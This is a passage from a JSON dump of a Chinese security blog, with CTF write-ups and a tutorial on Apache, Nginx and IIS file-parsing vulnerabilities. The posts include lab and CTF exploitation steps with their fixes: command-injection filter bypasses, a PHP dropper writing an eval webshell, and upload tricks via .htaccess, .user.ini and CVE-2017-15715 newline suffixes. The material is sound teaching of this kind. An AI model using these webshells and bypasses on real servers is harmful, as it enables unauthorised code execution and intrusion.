{"meta":{"title":"qwzf","subtitle":null,"description":null,"author":"qwzf","url":"https://qwzf.github.io","root":"/"},"pages":[{"title":"about","date":"2019-03-19T03:09:24.000Z","updated":"2019-03-19T03:10:43.303Z","comments":true,"path":"about/index.html","permalink":"https://qwzf.github.io/about/index.html","excerpt":"","text":"一个爱学习的小白"}],"posts":[{"title":"第二届“金盾杯”题目总结与复现","slug":"第二届“金盾杯”题目总结与复现","date":"2020-12-21T11:30:10.000Z","updated":"2021-03-23T12:29:54.238Z","comments":true,"path":"2020/12/21/第二届“金盾杯”题目总结与复现/","link":"","permalink":"https://qwzf.github.io/2020/12/21/第二届“金盾杯”题目总结与复现/","excerpt":"","text":"前言Web手，再次玩起了杂项。因为是省赛，所以题目除Web题外，并不太难(当然Web听说也不难，只不过对于我这个Web小菜鸡来说有点难)。上午ak了MISC，下午差一道题没有ak Crypto。然后就被Web第一题100分的题卡死，没去做下面的Web题，以为下边200分、300分的比100分的更难。比赛结束后，听说100分的第一道题做出来的人最少，emmmmm，我直接针不戳！好了先总结一下吧： MISCMISC1：注意数字考点：文件分离+伪加密+多层Base64编码+仿射密码和脑洞下载题目压缩包并解压。对“此图没有提示.jpg”文件，使用foremost进行文件分离，得到一个zip压缩包解压发现需要密码，使用winhex打开，发现是伪加密，于是将504B0304 后的3、4位，将504B0102后的5、6位的0900改为0000，即可破解伪加密解压得到1.txt文件，1.txt文件内容是Base64编码的。进行若干次Base64解码后，得到猜测接下来，需要对yqjb{lha-drwohjw-ekf}进行仿射密码解密。由“飞流直下三千尺，疑是银河落九天”，想到key1（a）为3，key2（b）为9。解密得到flag MISC2：小火龙冲啊考点：winhex末尾隐藏信息下载题目压缩包并解压。使用解压工具winRAR打开“小火龙.jpg”，发现加密的flag.txt文件使用winhex打开“小火龙.jpg”，在末尾发现解压密码：111111解压，输入解压密码，解压成功得到flag.txt文件，打开得到flag MISC3：五瓶药水考点：CRC32碰撞+Base64解码并排序+Base64转图片+winhex末尾隐藏flag下载压缩包题目文件，并解压，得到发现橙色.zip、红色.zip、黄色.zip、绿色.zip、青色.zip的文件大小都很小，里边压缩文件大小都是4字节于是想到4字节的CRC32碰撞，将这五个压缩包里的压缩文件的crc32，填到下列脚本的对应位置，进行碰撞 import binascii import string dic=string.printable crc1 = 0xe5c67f46 crc2 = 0x555fa1a2 crc3 = 0x6e957e45 crc4 = 0x76d6a31a crc5 = 0x2b042586 def crc32_4(crc): for i in dic : for j in dic: for p in dic: for q in dic: s=i+j+p+q if crc == (binascii.crc32(s.encode(&quot;ascii&quot;))): print (s) return 1 crc32_4(crc1) crc32_4(crc2) crc32_4(crc3) crc32_4(crc4) crc32_4(crc5) 将这五部分分别进行Base64解码:aW9u解码得ioncG90解码得potZ2Vu解码得genYjEy解码得b12Mw==解码得3按照一定顺序进行拼接得到flag.zip压缩包的解压密码：potiongenb123打开解压得到的flag.txt文件，得到很明显，Base64转图片，得到一个jpg图片，使用winhex打开jpg 图片，在最后边发现flag MISC4：我和十六有个约定考点：winhex末尾隐藏信息+16进制转字符串+Base64转图片+16进制每行2位一组逆序保存为图片+二维码拼图下载题目压缩包文件并解压，得到ababab.jpg和flag.zip文件。使用winhex打开ababab.jpg文件，在最后边发现keyis7034735377307244，将7034735377307244进行16进制转字符串得到p4sSw0rDp4sSw0rD即是flag.zip的解压密码，解压得到flag.txt和splice.txt文件。将splice.txt的文件内容进行Base64转图片，得到二维码标志位下载下来。打开flag.txt，发现每一行是jpg图片的16进制的逆序于是，写个脚本进行转换 input = open(&#39;flag.txt&#39;, &#39;r&#39;) input_all = input.readlines() for lins in input_all: ss = lins[::-1] num=ss.split(&#39; &#39;) for i in num: xx=i[::-1] print(xx,end=&#39; &#39;) input.close() 成功转换，在winhex里新建文件，将这些16进制粘贴到winhex里，并保存。打开发现是缺少二维码标志位的二维码主体部分将刚才得到的二维码标志位和这个主体部分进行拼图使用支付宝进行二维码扫描，得到flag MISC5：One_piece考点：压缩包暴力破解+社会主义核心价值观加密+BrainFuck编码+维吉尼亚密码+解读c语言代码得到密钥下载题目压缩包文件并解压，发现需要密码，由文件名四位数字，想到对压缩包口令进行暴力破解，得到压缩包解压密码：9156解压得到secret.c和路飞海贼团的烦恼.txt文件，打开路飞海贼团的烦恼.txt文件，发现一串密文：很明显是社会主义核心价值观加密，解密得解密结果，很明显是BrainFuck编码，解码得glbe{pnf_njedc_js_ufjs_kmvrocz!}解码结果感觉是维吉尼亚密码，但没有密钥。打开secret .c文件，根据代码意思得到密钥的四个字符的ASCII码值：ASCII码值转字符串得到密钥：\\aby于是对glbe{pnf_njedc_js_ufjs_kmvrocz!}进行维吉尼亚解密，得到flag CryptoCrypto1：Base考点：Base64转图片+Base92解码下载题目压缩包文件并解压，打开base文件于是Base64转图片，得到png图片，打开发现是二维码扫描得到对F#S&lt;YReBy{f.WwU{CSv^e^&#39;n*D进行Base92解码，得到flag Crypto2：不一样的凯撒*考点：脑洞+找规律+凯撒变形+十进制转字符题目密文是bhag{asb_zsz_vtsz_aszw}，将字符串转ASCII得： [98,104,97,103,123,97,115,98,95,122,115,122,95,118,116,115,122,95,97,115,122,119,125] bh对应的ASCII为98 104，如果变成fl则变成102 108，为偶数ag对应的ASCII为97 103，不变，为奇数所以，偶数+4，奇数不变，得到: [102,108,97,103,123,97,115,102,95,126,115,126,95,122,120,115,126,95,97,115,126,119,125] 转字符串，很明显有问题，126已经超出可见字符范围了，便减去26，转字符串得到flag [102,108,97,103,123,97,115,102,95,100,115,100,95,122,120,115,100,95,97,115,100,119,125] 转字符串得到flag：flag{asf_dsd_zxsd_asdw} Crypto3：今天是个好日子考点：unicode编码+Base64编码+脑洞+AES解密下载题目压缩包文件并解压，得到一个二维码，扫描结果，很明显是unicode编码，解码得解码结果是Base64编码，解码得：U2FsdGVkX1+ehXdDuA3EC7Tcr5bOHNhzbEPOz55Gdy5StZU7RDzY7Hfr5M1JoNtz然后再进行Base64解码发现加盐了，于是需要找到密钥，然后进行下面这些解密的其中一个由题目“今天是个好日子”想到今天(比赛那天)的日期20201220，即密钥然后进行AES解密，得到flag WebWeb1：web_checkin考点：命令执行+绕过黑名单打开题目，发现题目源码：绕过ls关键字过滤可使用dir命令绕过（但是没想到被坑了，dir没有列出当前目录下的文件，必须用dir .，我无语了emmmm。。。。）绕过空格过滤可使用%09绕过绕过文件读取过滤可使用cut读取文件、sed读取文件和file -f读取文件于是就产生了三种解：dir .列出当前目录下的文件，得到flag文件F14g_1s_h4rehaha.php cut%09-c%091-10000%09F14g_1s_h4rehaha.php sed%09-n%092p%09F14g_1s_h4rehaha.php file%09-f%09F14g_1s_h4rehaha.php 参考博客：河南省第二届金盾杯CTF web官方wp","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://qwzf.github.io/tags/Web/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"金盾杯","slug":"金盾杯","permalink":"https://qwzf.github.io/tags/金盾杯/"}],"author":"qwzf"},{"title":"浅谈解析漏洞的利用与防范","slug":"浅谈解析漏洞的利用与防范","date":"2020-10-20T11:23:19.023Z","updated":"2020-10-20T12:19:28.256Z","comments":true,"path":"2020/10/20/浅谈解析漏洞的利用与防范/","link":"","permalink":"https://qwzf.github.io/2020/10/20/浅谈解析漏洞的利用与防范/","excerpt":"","text":"本文首发于安全客，如果方便的话请阅读原文：https://www.anquanke.com/post/id/219107 0x00 前言继续学习常见漏洞，经常听说过解析漏洞，这次来一探究竟。 0x01 解析漏洞简介1、文件解析漏洞概述文件解析漏洞,是指Web容器（Apache、Nginx、IIS等）在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞。从而,黑客可以利用该漏洞实现非法文件的解析。2、web容器是什么web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如tomcat、apache、nginx等。(可以理解为编程语言提供环境) 中间件：提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。容器：给处于其中的应用程序组件(ASP,JSP,PHP)提供一个环境。使处于其中的应用程序组件之间跟容器中的环境变量接口交互，不必关注其他系统问题。攻击者在利用上传漏洞时，通常会与Web容器的解析漏洞配合在一起 0x02 Apache测试环境docker容器：kstaken/apache2在docker里安装php：apt-get update &amp;&amp; apt-get install php5靶场：DoraBox靶场修改站点根目录：vim /etc/apache2/sites-enabled/000-default 1、多后缀漏洞描述：在Apache 2.0.x &lt;= 2.0.59，Apache 2.2.x &lt;= 2.2.17，Apache 2.2.2 &lt;= 2.2.8中Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。所以可上传一个test.php.qwzf文件绕过验证且服务器依然会将其解析为php。Apache 能够识别的文件在mime.types文件里。影响版本：Apache 2.0.x &lt;= 2.0.59Apache 2.2.x &lt;= 2.2.17Apache 2.2.2 &lt;= 2.2.8开始测试：1.查看Apache版本： apachectl -v #或httpd -v(测试未显示Apache版本) 平时可以使用浏览器捕获的响应包或使用burp抓包查看apache版本。 2.在DoraBox的任意文件靶场进行测试上传的文件名：test.php.qwzf上传的文件内容 &lt;?php phpinfo(); ?&gt; 上传成功，访问看一下成功解析成php文件。修复方法：后缀验证尽量使用白名单的方式，这样即使使用不存在的后缀名，也无法绕过。 2、Apache配置问题1.如果在Apache的 /etc/apache2/apache2.conf里有这样的配置 &lt;FilesMatch &quot;qwzf.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这时只要文件名是qwzf.jpg，会以php 来执行。2.如果在Apache的 conf 里有这样一行配置AddHandler php5-script .php 这时只要文件名里包含.php即使文件名是qwzf.php.jpg也会以php 来执行。3.如果在 Apache 的 conf 里有这样一行配置AddType application/x-httpd-php .jpg即使扩展名是.jpg，也会以php来执行。 Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess(分布式配置文件)将Apache的/etc/apache2/sites-available/default里AllowOverride None改为AllowOverride All AllowOverride All 开启rewrite_mod a2enmod rewrite 这样.htaccess文件就会生效。开始测试：1.上传一个.htaccess文件，文件内容如下： 方法1： &lt;FilesMatch &quot;qwzf.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 方法2： AddHandler php5-script .php 方法3： AddType application/x-httpd-php .jpg 2.然后上传文件名为方法1和方法3：qwzf.jpg方法2和方法3：qwzf.php.jpg文件内容为：&lt;?php phpinfo(); ?&gt;修复方法：1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入 &lt;Files ~ “.(php.|php3.)”&gt; Order Allow,Deny Deny from all &lt;/Files&gt; 2.关闭重写 a2dismod rewrite 3、罕见后缀Apache配置文件中会有.+.ph(p[345]?|t|tml)此类的正则表达式，被当php程序执行的文件名要符合正则表达式。也就是说php3，php4，php5，pht，phtml等文件后缀也是可以被当作php文件进行解析的。上传一个查看phpinfo信息的qwzf.php3文件，访问发现qwzf.php3文件被当作php文件进行解析。 4、后缀包含换行符\\x0A(CVE-2017-15715)phith0n师傅在代码审计知识星球里提到了Apache的一个解析漏洞CVE-2017-15715漏洞描述：上传一个后缀末尾包含换行符的文件，来绕过FilesMatch。绕过FilesMatch不一定能被PHP解析。这个漏洞可以用来绕过文件上传黑名单限制。即： 1.php\\x0a =&gt; 1.php apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。 影响版本：Apache 2.4.0-2.4.29测试环境：1.环境一：用docker拉取一个名为vulhub/php:5.5-apache的镜像(Apache版本2.4.0~2.4.29之间)使用下面命令启动容器： docker run -d --name=cve-2017-15715 -p 8005:80 -v /var/www/bachang/cve-2017-15715:/var/www/html vulhub/php:5.5-apache 进入容器并查看Apache版本 docker exec -it cve-2017-15715 /bin/bash apachectl -v 将下面测试代码目录映射到容器内的/var/www/html目录下，设置好写权限，即可开始测试。 2.环境二：当然，如果感觉自己搭环境比较麻烦，可以使用vulhub靶场的CVE-2017-15715环境。环境位置：vulhub/httpd/CVE-2017-15715测试代码： &lt;html&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; file:&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br /&gt; filename:&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;qwzf.php&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php if (isset($_FILES[&#39;file&#39;])) { $name = basename($_POST[&#39;name&#39;]); $ext = pathinfo($name, PATHINFO_EXTENSION); if (in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) { exit(&#39;bad file&#39;); } move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;./&#39; . $name); } ?&gt; 开始测试：1.正常上传php文件，被拦截2.上传test.php.qwzf，上传成功，但不解析，说明老的多后缀Apache解析漏洞不存在。3.利用CVE-2017-15715，上传一个包含换行符的文件 注：只能是\\x0A，不能是\\x0D\\x0A 上传qwzf.php文件，filename设置为qwzf.php使用burp抓包，选择burp的Hex功能，在qwzf.php后面添加一个\\x0A发包，上传成功。然后访问qwzf.php%0A，发现可以成功解析php文件Nginx是一款高性能的WEB服务器，通常用来作为PHP的解析容器。 0x03 Nginx1、Nginx PHP CGI 解析漏洞(fix_pathinfo)漏洞描述：查看nginx的配置文件vim /etc/nginx/conf.d/default.conf（1）Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问http://x.x.x.x/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为phpinfo.jpg/1.php，然后构造成SCRIPT_FILENAME传递给PHP CGI。（2）但PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就涉及到fix_pathinfo选项了。如果PHP中开启了fix_pathinfo这个选项，PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。 简单来说，由于Nginx的特性，只要URL中路径名以.php结尾，不管该文件是否存在，直接交给php处理。 注：新版本php引入了security.limit_extensions，限制了可执行文件的后缀，默认只允许执行.php文件使得该漏洞难以被成功利用 相关知识：（1）通过phpinfo查看cgi.fix_pathinfo=1，PHP里经常要获取当前请求的URL路径信息。一般可以通过环境变量$_SERVER[‘PATH_INFO’]获取，而配置文件中的cgi.fix_pathinifo选项则与这个值的获取相关。（2）在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。影响版本：漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞漏洞形式： /1.jpg/1.php/1.jpg/.php/1.jpg%00.php/1.jpg/%20\\0.php 还有一种方法是：上传一个名字为qwzf.jpg，文件内容如下： &lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;qwzf&#39;]);?&gt;&#39;); ?&gt; 然后访问qwzf.jpg/.php,在当前目录下就会生成一句话木马shell.php 测试环境：1.环境一：vulhub靶场的漏洞环境环境位置：vulhub/nginx/nginx_parsing_vulnerabilitynginx版本：nginx/1.19.22.环境二：使用phpstudy测试，默认配置即可(默认的cgi.fix_pathinfo是注释状态，但默认值确为1)nginx版本：nginx/1.11.5开始测试：使用环境一的vulhub靶场对应的环境上传一个jpg文件，文件名为phpinfo.jpg，文件内容为(或者上传图片马)： GIF89a &lt;?php phpinfo(); ?&gt; 上传成功，访问一下 /uploadfiles/b5f7a062d84869fe4f3af35b79fca50c.jpg/1.php /uploadfiles/b5f7a062d84869fe4f3af35b79fca50c.jpg/.php /uploadfiles/b5f7a062d84869fe4f3af35b79fca50c.jpg/%20\\0.php 发现除了%00截断外，均以php的形式解析，显示phpinfo信息%00截断不能成功，原因应该是PHP的版本问题。%00截断使用条件：php 版本&lt;5.3.4修复方法：1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0(慎用);若实在将cgi.fix_pathinfo的值设置为0，就将php-fpm.conf中的security.limit_extensions后面的值设置为.php2.在Nginx配置文件中添加以下代码： if ( $fastcgi_script_name ~ ..*/.*php ) { return 403; } 代码的意思：当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。3.使用Apache服务器的，在相应目录下放一个 .htaccess 文件，内容为： &lt;FilesMatch &quot;(?i:\\.php)$&quot;&gt; Deny from all &lt;/FilesMatch&gt; 4.不提供上传的原文件访问，对文件输出经过程序处理。5.图片单独放一个服务器上，与业务代码数据进行隔离。 2、空字节代码执行漏洞漏洞描述：Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码影响版本:Nginx 0.5.xNginx 0.6.xNginx 0.7-0.7.65Nginx 0.8-0.8.37测试环境：nginx官网由于环境比较旧，不太容易搭建，这里只阐述一下大致过程：1.上传一个qwzf.jpg图片文件2.访问http://x.x.x.x/qwzf.jpg％00.php3.就会将qwzf.jpg作为PHP文件进行解析修复方法：1.升级nginx2.禁止在上传文件目录下执行php文件3.在nginx配置或者fcgi.conf配置添加下面内容： if ($request_filename ~* (.*)\\.php) { set $php_url $1; } if (!-e $php_url.php) { return 403; } 3、nginx文件名逻辑漏洞(CVE-2013-4547)漏洞描述：1.漏洞产生原因：错误地解析了请求的URL,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。2.漏洞原理：Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见写法： location ~ \\.php$ { include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; } （1）在关闭fix_pathinfo的情况下(即cgi.fix_pathinfo=0)，只有.php后缀的文件才会被发送给fastcgi解析（2）存在CVE-2013-4547时，请求qwzf.jpg[0x20][0x00].php，这个URI可匹配到正则\\.php$，进入到Location块；（3）进入后，Nginx错误地认为请求的文件是qwzf.jpg[0x20]，然后设置其为SCRIPT_FILENAME的值发送给fastcgi。（4）fastcgi根据SCRIPT_FILENAME的值，将qwzf.jpg[0x20]以php文件的形式进行解析，从而造成了解析漏洞。也就是说，我们只需要上传一个空格结尾的文件，即可用PHP进行解析。影响版本:Nginx 0.8.41-1.4.3Nginx 1.5 -1.5.7测试环境：vulhub靶场的漏洞环境环境位置：vulhub/nginx/CVE-2013-4547nginx版本：nginx/1.4.2开始测试：上传一个jpg文件，文件名为qwzf.jpg，文件内容为(或者上传图片马)： GIF89a &lt;?php phpinfo(); ?&gt; 使用burp添加空格发包，成功上传文件访问/uploadfiles/qwzf.jpg/.php，burp抓包，添加两个空格使用burp的hex功能，将第二个空格的0x20改为0x00发包，成功解析。 0x04 IISIIS(Internet Information Services)是微软出品的灵活、安全、易于管理的Web服务器。 1、IIS 5.x和IIS 6.x解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语言一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。测试环境：因为找不到相关环境，并且不想搭建，所以这里只阐述相关原理和相关知识。 1.目录解析(6.0)形式：http://www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 2.文件解析(6.0)形式：http://www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件。 3.解析文件类型(默认解析后缀)有的网站会设置黑名单上传限制 ,IIS6.0 默认的可执行文件除了asp还包含这三种 : /xx.asa /xx.cer /xx.cdx iis把asa，cdx，cer解析成asp文件的原因：这四种扩展名都是用的同一个asp.dll文件来执行。修复方法：1.阻止创建.asp和.asa类型的文件夹2.阻止上传xx.asp;.jpg类型的文件名3.阻止上传.asa、.cer和.cdx后缀的文件4.设置权限，限制用户创建文件夹 2、IIS 7.0/7.5 CGI解析漏洞漏洞描述：IIS7/7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7/7.5本身的漏洞。漏洞产生的条件：php.ini里的cgi.cgi_pathinfo=1IIS7在Fast-CGI运行模式下测试环境：windows server 2008 R2（x64）IIS7phpStudy 2018版本开始测试：首先在VMware安装windows server 2008 R2虚拟机(比较简单，百度搜教程即可)，然后安装IIS7和phpStudy 2018。可参考：IIS7.0解析漏洞写一个index.php文件测试环境是否能正常工作。正常工作。接下来，正式开始测试1.在站点根目录创建一个qwzf.jpg文件，文件内容为： &lt;?php phpinfo(); ?&gt; 2.配置CGI 模式（1）在php.ini文件里将cgi.fix_pathinfo 取消注释并把值改为1（2）更改网站的处理程序映射管理工具 –&gt; IIS -&gt; WIN-5RQ4P819403 -&gt; 处理程序映射3.访问http://192.168.201.149/qwzf.jpg/.php发现qwzf.jpg成功解析。常用利用方法：上传图片马 0x05 .user.ini.user.ini 作用和配置.htaccess是伪静态环境配置文件，用于lamp。.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取. 为了防止跨站，可将 .user.ini放在网站根目录下，内容为：open_basedir=/项目路径/:/tmp/:/proc/如：open_basedir=/var/www/html/:/tmp/:/proc/测试代码： &lt;?php //获取当前文件所在的绝对目录 $dir = dirname(__FILE__); echo &quot; &lt;pre&gt;&quot;; print_r($dir); //读取根目录文件夹vim $file = scandir(&#39;/&#39;); //显示 echo &quot; &lt;pre&gt;&quot;; print_r($file); ?&gt; 没加.user.ini的时候可以直接读到根目录的文件加上.user.ini之后，就读不到根目录的文件了.user.ini文件利用 利用条件：1.服务器脚本语言为PHP2.服务器使用CGI／FastCGI模式3.上传目录下要有可执行的php文件 参考：user.ini文件构成的PHP后门大师傅博客里对.user.ini的解释具体可以怎样理解呢？我的对其总结如下： 1.php.ini作为php的默认的配置文件，包括很多php配置，可分为：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 2.模式为PHP_INI_USER的配置项，可在ini_set()函数中设置、注册表中设置和.user.ini中设置 3.PHP会在每个目录下扫描 INI 文件，从被执行PHP 文件所在目录一直上升到 web 根目录($_SERVER[&#39;DOCUMENT_ROOT&#39;]所指定的)。若被执行PHP 文件在 web 根目录之外，则只扫描该目录。 4..user.ini简单来说，就是一个可以由用户“自定义”的php.ini，可以自定义的设置是模式为PHP_INI_PERDIR 、 PHP_INI_USER的设置(实际上，除PHP_INI_SYSTEM外的模式都可以通过.user.ini来设置)。 5..user.ini是一个能被动态加载的ini文件。也就是修改.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间(默认为300秒)，即可被重新加载。 6.php配置项auto_prepend_file(auto_append_file)，指定一个文件，自动包含在要执行的文件前(后)，类似于在文件前(后)调用了require()函数。即借助.user.ini文件，可让所有php文件都“自动”包含某个文件(当文件调用的有exit()时该设置无效） 可直接在.user.ini中设置要包含的文件(如webshell、图片马等)： auto_prepend_file=qwzf.jpg qwzf.jpg即是可执行php文件要包含的文件。开始测试：直接使用vulhub靶场vulhub/nginx/CVE-2013-4547环境，在uploadfiles目录下创建一个可执行的php文件index.php（1）上传.user.ini文件，内容如下： GIF89a auto_prepend_file=qwzf.jpg （2）上传图片马qwzf.jpg，内容如下： GIF89a &lt;?php phpinfo(); ?&gt; 访问/uploadfiles/index.php，发现qwzf.jpg被成功包含到index.php之前进行解析 0x06 Windows操作系统文件命名规则Windows操作系统中，文件名不能以空格或.开头，也不能以空格或.结尾。当把一个文件命名为以空格或.开头或结尾时，会自动地去掉开头和结尾处的空格和.。利用此特性，也可能造成文件解析漏洞。 参考博客：文件解析漏洞总结CTF考点总结-文件上传/文件包含利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单文件上传漏洞，解析漏洞总结解析漏洞整理典型漏洞归纳之解析漏洞服务器解析漏洞总结文件解析漏洞总结-NginxNginx错误配置引发的解析漏洞复现nginx文件名逻辑漏洞_CVE-2013-4547漏洞复现nginx+php使用open_basedir限制站点目录防止跨站","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"解析漏洞","slug":"漏洞原理/解析漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/解析漏洞/"}],"tags":[{"name":"Apache解析漏洞","slug":"Apache解析漏洞","permalink":"https://qwzf.github.io/tags/Apache解析漏洞/"},{"name":"Nginx解析漏洞","slug":"Nginx解析漏洞","permalink":"https://qwzf.github.io/tags/Nginx解析漏洞/"},{"name":"IIS解析漏洞","slug":"IIS解析漏洞","permalink":"https://qwzf.github.io/tags/IIS解析漏洞/"}],"author":"qwzf"},{"title":"“中能融合杯”第六届工控大赛线上赛部分题总结与复现","slug":"“中能融合杯”第六届工控大赛线上赛部分题总结与复现","date":"2020-09-14T14:18:34.102Z","updated":"2020-09-14T15:55:32.097Z","comments":true,"path":"2020/09/14/“中能融合杯”第六届工控大赛线上赛部分题总结与复现/","link":"","permalink":"https://qwzf.github.io/2020/09/14/“中能融合杯”第六届工控大赛线上赛部分题总结与复现/","excerpt":"","text":"前言“中能融合杯”第六届工控大赛线上赛已经结束，题目只有杂项题(包括工控题)和逆向题。作为一名Web狗，就只能去做杂项了，杂项题挺容易的，好多都是以前的原题。关卡4的3个题发现应该都是工控题，然而我一个都不会做，I am 太菜了。。队友chumen77太强了，在最后半小时做出一道逆向题，基本保住了去线下赛的资格(前20)！ 签到题考点：西门子s7协议分析 题目描述：0300002402f080320100000009000e00050501120a100100010000830000290003000101请解读协议内容，并准确的拿到返回值，并关注公众号：工控安全竞赛，回复返回值即可获得flag 查询百度，发现是西门子s7协议，并且是原题：https://wenku.baidu.com/view/c29ee884366baf1ffc4ffe4733687e21ae45ff5f.html 把写入数据返回的值回复到公众号，即可得到flag ICS_1考点：Stegsolve使用+拼二维码 题目描述：在有限的时间，拼出正确的二维码 先下载附件，是一个gif 图片，通过观察发现是几组被切开的二维码。使用Stegsolve分离出18张被切开的二维码图片 在ppt里使用9张二维码碎片进行拼图，得到一张二维码，另一张是假的二维码 扫描，得到flag。 ICS_4考点：查看图片属性+Stegsolve使用 题目描述：隐藏颇深的flag，你一定可以找到它 下载题目，发现是一个jpg图片。使用binwalk分析，发现里边隐藏了压缩包文件 使用winRAR解压，发现压缩包带有密码。在jpg图片属性里的详细信息发现一串特殊字符 很明显，可能是Base64编码，Base64解码得到 这个应该就是压缩包解压密码，输入密码，解压压缩包得到elec1.jpg图片。使用Stegsolve分析elec1.jpg图片，在使用File Format查看图片信息时，发现了flag ICS_10考点：pdf隐藏文字 题目描述：数字取证，找出flag 下载题目，发现是一个pdf文件，打开，发现是以前做过的原题。这道题flag字符串使用了透明的字符 直接复制，粘贴到一个普通文件里，即可看到flag。 ICS_12考点：文件分离+佛语解密+Base家族 题目描述：一只猫的心思：你能读懂我的心思吗？ 下载题目文件，发现是一个jpg图片。看着很眼熟，是ISCC2018的原题。foremost分离图片中隐藏的文件，得到一个doc文件，打开doc文件 很明显，是佛曰密码，使用在线佛曰解密网站解密即可佛曰解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx在佛曰密码前加上如是我闻：解密结果是16进制，直接16进制转ASCII码-&gt;Base64解码-&gt;Base32解码-&gt;Base16解码-&gt;Base64解码-&gt;Base32解码-&gt;Base16解码得到flag。 其他题参考我们团队的公众号。。。 后记杂项没什么新的知识，基本都是常见操作。作为一个学Web的，没发现有Web题，感受到了杂项真香！！！继续努力！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"中能融合杯","slug":"中能融合杯","permalink":"https://qwzf.github.io/tags/中能融合杯/"}],"author":"qwzf"},{"title":"羊城杯Web题总结与复现","slug":"羊城杯Web题总结与复现","date":"2020-09-11T13:03:10.000Z","updated":"2020-09-14T15:52:25.754Z","comments":true,"path":"2020/09/11/羊城杯Web题总结与复现/","link":"","permalink":"https://qwzf.github.io/2020/09/11/羊城杯Web题总结与复现/","excerpt":"","text":"0x00 前言总结一下羊城杯的Web题，就做出几道。发现有的题是原题改的，不过涉及到一些没有学过的知识，简单总结一下。 0x01 easycon考点：一句话木马+base64转图片打开题目，发现是Apache默认页，使用扫描工具扫描一下发现index.php，访问发现弹窗eval post cmd，意思很明显，就是post传入cmd参数，并且应该使用了eval()函数。所以，源码里应该有&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;，一句话木马，蚁剑直接连发现上图所示的这些文件，发现bbbbbbbbb.txt里边的文件内容很多，并且像base64编码。同时看到开头的/9j/，根据经验是base64编码转图片，并且头部缺少内容data:image/jpg;base64,找一个base64在线转图片的网站，加上缺少的内容，进行转换，得到带有flag的图片 0x02 BlackCat考点：文件分析+代码审计+弱类型+hash查看源代码，发现注释&lt;!--都说听听歌了！--&gt;。于是下载引用的音频文件Hei_Mao_Jing_Chang.mp3，使用winhex打开，在最后边发现复制出来，得到源码： //post传入Black-Cat-Sheriff和One-ear绕过判断 if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){ 